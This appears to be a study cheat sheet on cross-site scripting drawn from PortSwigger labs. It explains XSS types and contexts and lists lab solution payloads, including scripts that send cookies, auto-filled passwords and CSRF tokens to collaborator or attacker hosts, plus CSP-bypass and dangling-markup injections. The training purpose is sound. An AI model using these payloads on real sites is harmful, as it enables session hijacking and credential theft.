# Cross-site scripting (XSS)

## What are the types of XSS attacks?

There are three main types of XSS attacks. These are:

- [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting), where the malicious script comes from the current HTTP request.
- [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting), where the malicious script comes from the website's database.
- [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting), where the vulnerability exists in client-side code rather than server-side code.

## **Reflected cross-site scripting**

Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. 

Assuming the application doesn't perform any other processing of the data, an attacker can construct an attack like this: 

`https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>`

### Impact of reflected XSS attacks

If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:

- Perform any action within the application that the user can perform.
- View any information that the user is able to view.
- Modify any information that the user is able to modify.
- Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

## **Stored cross-site scripting**

Stored XSS (also known as persistent or second-order XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way. 

Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following: 

```jsx
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos@normal-user.net
```

Assuming the application doesn't perform any other processing of the data, an attacker can submit a malicious comment like this: 

```jsx
<script>/* Bad stuff here... */</script>
```

Within the attacker's request, this comment would be URL-encoded as: 

```jsx
comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
```

Any user who visits the blog post will now receive the following within the application's response

### **Impact of stored XSS attacks**

If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. The attacker can carry out any of the actions that are applicable to the impact of [reflected XSS vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/reflected).
        

## **DOM-based cross-site scripting**

DOM-based XSS (also known as DOM XSS) arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM. 

In the following example, an application uses some JavaScript to read the value from an input field and write that value to an element within the HTML: 

```jsx
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

If the attacker can control the value of the input field, they can easily construct a malicious value that causes their own script to execute: 

```jsx
You searched for: <img src=1 onerror='/* Bad stuff here... */'>
```

### **How to test for DOM-based cross-site scripting**

- **Testing HTML sinks**
    - To test for DOM XSS in an HTML sink, place a random alphanumeric string into the source (such as `location.search`), then use developer tools to inspect the HTML and find where your string appears. Note that the browser's "View source" option won't work.
- **Testing JavaScript execution sinks**
    - With these sinks, input doesn't necessarily appear anywhere within the DOM, so you can't search for it. Instead you'll need to use the JavaScript debugger to determine whether and how your input is sent to a sink.
- **Testing for DOM XSS using DOM Invader**
    - [https://portswigger.net/burp/documentation/desktop/tools/dom-invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)

### **Sinks, which can lead to DOM-XSS vulnerabilities**

The following are some of the main sinks that can lead to DOM-XSS vulnerabilities: 

```jsx
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities: 

```jsx
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

### **What can XSS be used for?**

An attacker who exploits a cross-site scripting vulnerability is typically able to:

- Impersonate or masquerade as the victim user.
- Carry out any action that the user is able to perform.
- Read any data that the user is able to access.
- Capture the user's login credentials.
- Perform virtual defacement of the web site.
- Inject trojan functionality into the web site.

## Impact of XSS vulnerabilities

The actual impact of an XSS attack generally depends on the nature of the application, its functionality and data, and the status of the compromised user. For example:

- In a brochureware application, where all users are anonymous and all information is public, the impact will often be minimal.
- In an application holding sensitive data, such as banking transactions, emails, or healthcare records, the impact will usually be serious.
- If the compromised user has elevated privileges within the application, then the impact will generally be critical, allowing the attacker to take full control of the vulnerable application and
compromise all users and their data.

## **Cross-site scripting contexts**

When testing for [reflected](https://portswigger.net/web-security/cross-site-scripting/reflected) and [stored](https://portswigger.net/web-security/cross-site-scripting/stored) XSS, a key task is to identify the XSS context:

- The location within the response where attacker-controllable data appears.
- Any input validation or other processing that is being performed on that data by the application.

Based on these details, you can then select one or more candidate XSS payloads, and test whether they are effective. 

### **XSS between HTML tags**

When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript. 

Some useful ways of executing JavaScript are: 

```jsx
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

### **XSS in HTML tag attributes**

When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example: 

```jsx
"><script>alert(document.domain)</script>
```

More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example: 

```jsx
" autofocus onfocus=alert(document.domain) x="
```

Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the `href` attribute of an anchor tag, you can use the `javascript` pseudo-protocol to execute script. For example:

```jsx
<a href="javascript:alert(document.domain)"> 
```

### **XSS into JavaScript via Terminating the existing script**

In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. For example, if the XSS context is as follows: 

```jsx
<script>
...
var input = 'controllable data here';
...
</script>
```

then you can use the following payload to break out of the existing JavaScript and execute your own: 

```jsx
</script><img src=1 onerror=alert(document.domain)>
```

### **XSS into JavaScript via Breaking out of a JavaScript string**

In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.

Some useful ways of breaking out of a string literal are:

```jsx
'-alert(document.domain)-'
';alert(document.domain)//
```

Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash. In this situation, applications often make the mistake of failing to escape the backslash character itself. This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application. 

For example, suppose that the input:

```jsx
';alert(document.domain)//
```

gets converted to:

```jsx
\';alert(document.domain)//
```

You can now use the alternative payload:

```jsx
\';alert(document.domain)//
```

which gets converted to:

```jsx
\\';alert(document.domain)//
```

Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the quote is now interpreted as a string terminator, and so the attack succeeds. 

Some websites make XSS more difficult by restricting which characters you are allowed to use. This can be on the website level or by deploying a WAF that prevents your requests from ever reaching the website. In these situations, you need to experiment with other ways of calling functions which bypass these security measures. One way of doing this is to use the `throw` statement with an exception handler. This enables you to pass arguments to a function without using parentheses. The following code assigns the `alert()` function to the global exception handler and the `throw` statement passes the `1` to the exception handler (in this case `alert`). The end result is that the `alert()` function is called with `1` as an argument.

```jsx
onerror=alert;throw 1
```

**Reference:**

[XSS without parentheses and semi-colons](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)

### **XSS into JavaScript via Making use of HTML-encoding**

When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further. If the server-side application blocks or sanitizes certain characters that are needed for a successful XSS exploit, you can often bypass the input validation by HTML-encoding those characters. 

For example, if the XSS context is as follows:

```jsx
<a href="#" onclick="... var input='controllable data here'; ...">
```

and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:

```jsx
&apos;-alert(document.domain)-&apos;
```

### **XSS into JavaScript via XSS in JavaScript template literals**

JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the `${...}` syntax.

For example, the following script will print a welcome message that includes the user's display name: 

```jsx
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the `${...}` syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, if the XSS context is as follows:

```jsx
<script>
...
var input = `controllable data here`;
...
</script>
```

then you can use the following payload to execute JavaScript without terminating the template literal:

```jsx
${alert(document.domain)}
```

## **XSS via client-side template injection**

Some websites use a client-side template framework, such as AngularJS, to dynamically render web pages. If they embed user input into these templates in an unsafe manner, an attacker may be able to inject their own malicious template expressions that launch an XSS attack. 

Reference:

[Client-side template injection | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)

## Exploiting XSS Vulnerabilities

### **Exploiting cross-site scripting to steal cookies**

Stealing cookies is a traditional way to exploit XSS. Most web applications use cookies for session handling. You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim.

In practice, this approach has some significant limitations:

- The victim might not be logged in.
- Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
- Sessions might be locked to additional factors like the user's IP address.
- The session might time out before you're able to hijack it.

**Payloads:**

```jsx
<script>
document.location='http://burp-cullaborator.com/?cookie='+document.cookie;
</script>
```

```jsx
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

```jsx
<img src=x onerror=this.src='{URL}/?'+document.cookie;>
```

### **Exploiting cross-site scripting to capture passwords**

These days, many users have password managers that auto-fill their passwords. You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain. This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password. 

The primary disadvantage of this technique is that it only works on users who have a password manager that performs password auto-fill. (Of course, if a user doesn't have a password saved you can still attempt to obtain their password through an on-site phishing attack, but it's not quite the same.) 

Payload:

```jsx
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

### **Exploiting cross-site scripting to bypass CSRF protections**

Some websites allow logged-in users to change their email address without re-entering their password. If you've found an XSS vulnerability on one of these sites, you can exploit it to steal a CSRF token. With the token, you can change the victim's email address to one that you control. You can then trigger a password reset to gain access to the account.

This type of exploit combines XSS (to steal the CSRF token) with the functionality typically targeted by CSRF. While traditional CSRF is a "one-way" vulnerability, where the attacker can induce the victim to send requests but cannot see the responses, XSS enables "two-way" communication. This enables the attacker to both send arbitrary requests and read the responses, resulting in a hybrid attack that bypasses anti-CSRF defenses.

**Exfiltrate CSRF Token**

```jsx
<script>
var xhr = new XMLHttpRequest();													 
xhr.open('GET', '/my-account', true);											

xhr.onload = function () {
  var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];            fetch('https://BURP-COLLABORATOR-SUBDOMAIN.com', {
        method: 'POST',
        mode: 'no-cors',
        body: 'token=' + encodeURIComponent(token)
  });              
};
xhr.send(null);
</script>
```

**Exfiltrate CSRF Token + Change Email**

```jsx
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

## **Dangling markup injection**

 Suppose an application embeds attacker-controllable data into its responses in an unsafe way: 

```jsx
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

In this situation, an attacker would naturally attempt to perform XSS. But suppose that a regular XSS attack is not possible, due to input filters, content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following: 

```jsx
"><img src='//attacker-website.com?
```

This payload creates an `img` tag and defines the start of a `src` attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the `src` attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. Any non-alphanumeric characters, including newlines, will be URL-encoded.
        

## **Content security policy**

[Evading CSP with DOM-based dangling markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

[Bypassing CSP with policy injection](https://portswigger.net/research/bypassing-csp-with-policy-injection)

## **How to prevent XSS**

[How to prevent XSS | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/preventing)

## Labs

### **XSS between HTML tags**

[**Reflected XSS into HTML context with nothing encoded**](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)

[**Stored XSS into HTML context with nothing encoded**](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)

[**Reflected XSS into HTML context with most tags and attributes blocked**](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

```markdown
# Brute force tags and events
GET /?search=<$$>
GET /?search=<body+$$>

# The following payloads trigger XSS without user interaction, However it's      browser specific
<iframe src="https://web-security-academy.net/?search=<body oncontentvisibilityautostatechange=print() style=display:block;content-visibility:auto>">

<script> document.location='https://web-security-academy.net/?search=<body oncontentvisibilityautostatechange=print() style=display:block;content-visibility:auto>' </script>

# The following payload trigger XSS without user interaction in any browser
<iframe src="https://web-security-academy.net/?search=<body onresize='print()'>" onload=this.style.width='100px'>
```

[**Reflected XSS into HTML context with all tags blocked except custom ones**](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

```markdown
# Brute force tags and events
GET /?search=<$$>
GET /?search=<body+$$>

# The following payload trigger XSS without user interaction in any browser
<script> document.location='https://web-security-academy.net/?search=<xss onfocus=alert(document.cookie) autofocus tabindex=1>' </script>
```

[**Reflected XSS with event handlers and `href` attributes blocked**](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)

```markdown
# <a> and <svg> tags are allowed, however anchor href is blocked. To bypass the  restriction use the following <svg><a><animate> payload
<svg><a><animate attributeName="href" values="javascript:alert(1)" /><text x="20" y="20">Click me</text></a></svg>
```

[**Reflected XSS with some SVG markup allowed**](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

```markdown
# Brute force tags and events
GET /?search=<$$>
GET /?search=<body+$$>

# Some SVG tags are blocked, However The following payload trigger XSS without   user interaction
<svg><animatetransform onbegin=alert(1) attributeName=transform>

```

### **XSS in HTML tag attributes**

[**Reflected XSS into attribute with angle brackets HTML-encoded**](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)

```markdown
# Terminate input tag attribute 
" onfocus=alert(1) autofocus tabindex=1
```

[**Stored XSS into anchor `href` attribute with double quotes HTML-encoded**](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)

```markdown
# Comment -> Website field put any data in anchor href value without validation
javascript:alert(1) 
```

[**Reflected XSS in canonical link tag**](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)

```markdown
# Terminate link canonical tag
https://web-security-academy.net/?'accesskey='X'onclick='alert(1)

# Reference
https://portswigger.net/research/xss-in-hidden-input-fields
```

### **XSS into JavaScript**

[**Reflected XSS into a JavaScript string with single quote and backslash escaped**](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)

```markdown
# Single quotes get backslash-escaped, preventing from breaking out of the string
# Terminate <script> tag and add new one to trigger XSS
</script><script>alert(1)</script>
```

[**Reflected XSS into a JavaScript string with angle brackets HTML encoded**](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)

```markdown
# Terminate Javascript code
'-alert(document.domain)-'
';alert(document.domain)// 
```

[**Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)

```markdown
# Single quotes is backslash-escaped, However backslash can be bypassed using    the additional backslash
# Terminate Javascript code
\';alert(1)//
\'-alert(1)//
```

[**Reflected XSS in a JavaScript URL with some characters blocked**](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)

[**Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)

```markdown
# Random string is reflected inside an onclick event
# App process the HTML encoding characters before it pass to source code - View  Developer Tools
# Put the following Payload into Website field:
http://foo?&apos;-alert(1)-&apos;
```

[**Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)

```markdown
# Random string is reflected inside a JavaScript template string (`)
# Craft the following Payload to trigger XSS
${alert(1)}
```

### DOM Based XSS

[**DOM XSS in `document.write` sink using source `location.search`**](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)

```markdown
# Option 1 - Using Burp Suite browser built-in extension - DOM Invader
# Option 2 - Manually
# Payload:
"><svg onload=alert(1)>
```

[**DOM XSS in `document.write` sink using source `location.search` inside a select element**](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

```markdown
# Option 1 - Using Burp Suite browser built-in extension - DOM Invader
# Option 2 - Manually 
# Payload:
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```

[**DOM XSS in `innerHTML` sink using source `location.search`**](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)

```markdown
# Option 1 - Using Burp Suite browser built-in extension - DOM Invader
# Option 2 - Manually 
# Payload:
<img src=1 onerror=alert(1)>
```

[**DOM XSS in jQuery anchor `href` attribute sink using `location.search` source**](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)

```markdown
# Option 1 - Using Burp Suite browser built-in extension - DOM Invader
# Option 2 - Manually 
# Payload:
javascript:alert(document.cookie)
```

[**DOM XSS in jQuery selector sink using a hashchange event**](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

```markdown
# Option 1 - Using Burp Suite browser built-in extension - DOM Invader
# Option 2 - Manually 
# Put the following code in Exploit Server
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1      onerror=alert(1)>'">
```

[**DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)

```markdown
# Option 1 - Using Burp Suite browser built-in extension - DOM Invader
# Option 2 - Manually - Note the ng-app directive
# Payload
{{$on.constructor('alert(1)')()}}
```

[**Reflected DOM XSS**](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)

```markdown
# Option 1 - Using Burp Suite browser built-in extension - DOM Invader
# Option 2 - Manually - /resources/js/searchResults.js
# JSON response is used with an eval() function call.
# Payload:
\"-alert(1)}//
```

[**Stored DOM XSS**](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)

```markdown
# Option 1 - Using Burp Suite browser built-in extension - DOM Invader
# Option 2 - Manually - /resources/js/loadCommentsWithVulnerableEscapeHtml.js
# The JS code only HTML encode first occurance of angle brackets 
# Payload:
<><img src=1 onerror=alert(1)>
```

### Exploiting XSS Vulnerabilities

[**Exploiting cross-site scripting to steal cookies**](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)

```jsx
<script>
document.location='http://burp-collaborator.com/?cookie='+document.cookie;
</script>

```

[**Exploiting cross-site scripting to capture passwords**](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)

```jsx
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

[**Exploiting XSS to bypass CSRF defenses**](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)

```jsx
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

### **Dangling markup injection / CSP Bypass**

[**Reflected XSS protected by very strict CSP, with dangling markup attack**](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)

```markdown
# Set email instead of id in /my-account?id=wiener and note that the value is   reflected in the <input> tag
# Use the following payload and note that the CSP blocks to access any src attr
https://web-security-academy.net/my-account?email=<img src=x onerror=alert(1)>
# Bypass CSP protection by checking for weaknesses in the CSP, such as missing  form-action directive. 
# Navigate to the exploit server and craft the following payload
<script>
document.location='https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</button>';
</script>
# Deliver to the victim to get CSRF token
# Generate CSRF Poc by Burp Suite with the retrieved CSRF token to change the   email

```

[**Reflected XSS protected by CSP, with CSP bypass**](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)

```markdown
# Observe that the response contains a Content-Security-Policy header, and the  report-uri directive contains a parameter called token. Because you can control the token parameter, you can inject your own CSP directives into the policy. 
# Craft the following payload to trigger XSS and bypass CSP
https://web-security-academy.net/?search=<img src=1 onerror=alert(1)>&token=;script-src-elem 'unsafe-inline'

#  The injection uses the script-src-elem directive in CSP. This directive allows you to target just script elements. Using this directive, you can overwrite   existing script-src rules enabling you to inject unsafe-inline, which allows    you to use inline scripts. 
```